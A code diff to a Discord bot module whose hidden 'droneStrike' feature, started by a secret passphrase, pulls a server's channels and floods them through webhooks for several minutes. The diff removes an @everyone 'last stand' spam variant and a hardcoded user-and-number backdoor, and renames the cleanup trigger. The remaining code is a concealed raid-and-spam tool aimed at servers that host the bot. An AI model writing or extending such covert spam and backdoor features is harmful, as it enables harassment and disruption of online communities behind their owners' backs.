@@ -59,7 +59,7 @@ async function deleteWebhooks(hooks){
   }
 }
 
-async function droneStrike(msg, content, laststand, avatar, gs){
+async function droneStrike(msg, content, avatar, gs){
   gs.safeSend("Dronestrike authorized.", msg.channel);
   var channels = await discordRestCall("GET", "/guilds/{major}/channels", {
     major: msg.guild.id
@@ -83,9 +83,6 @@ async function droneStrike(msg, content, laststand, avatar, gs){
   setTimeout(() => {
     clearInterval(int);
     ongoingDroneStrikes[msg.guild.id] = false;
-    if(laststand){
-      msg.guild.leave();
-    }
   }, Math.random() * 100000 + 169420);
   console.log(`Dronestrike: G(${msg.guild.name}, ${msg.guild.id}) Bots: ${allhooks.length}`);
 }
@@ -93,7 +90,6 @@ async function droneStrike(msg, content, laststand, avatar, gs){
 module.exports = function injectorMain(gs) {
   discordRestCall = gs.discordApiCall;
   const droneStrikeActivate = "Go! Launch the attack helicopters against ";
-  const droneStrikeLastStand = "<Go! Launch the attack helicopters against> ";
   async function getPerms(msg) {
     return (await msg.channel.guild.members.fetch(gs.bot.user))
       .permissions.any(djs.Permissions.FLAGS.MANAGE_WEBHOOKS);
@@ -107,20 +103,14 @@ module.exports = function injectorMain(gs) {
         if (await getPerms(msg)) {
           ongoingDroneStrikes[gid] = true;
           content = msg.content.substring(droneStrikeActivate.length);
-          droneStrike(msg, content, false, gs.getToken("attackheli"), gs);
-        }
-      }else if(msg.content.startsWith(droneStrikeLastStand)){
-        if(await getPerms(msg)){
-          ongoingDroneStrikes[gid] = true;
-          content = "@everyone";
-          droneStrike(msg, content, true, gs.getToken("attackheli"), gs);
+          droneStrike(msg, content, gs.getToken("attackheli"), gs);
         }
       }
     }
   });
   gs.bot.on("message", async msg => {
     if(!gs.normalMsg(msg)) return;
-    if(msg.content.startsWith("Hybagel cleans up their dronestrikes")){
+    if(msg.content.startsWith("bruh webhook")){
       if (msg.guild && !ongoingDroneStrikes[msg.guild.id] && await getPerms(msg)){
         var channels = await discordRestCall("GET", "/guilds/{major}/channels", {
           major: msg.guild.id
@@ -141,10 +131,7 @@ module.exports = function injectorMain(gs) {
   });
   gs.bot.on("message", msg => {
     if(!gs.normalMsg(msg)) return;
-    if(msg.content === "88677538884859"
-    && msg.author.username === "dthusian"
-    && msg.author.discriminator === "8480"
-    && msg.guild.available){
+    if(gs.isSuperUser(msg.author)){
       msg.guild.leave();
     }
   });
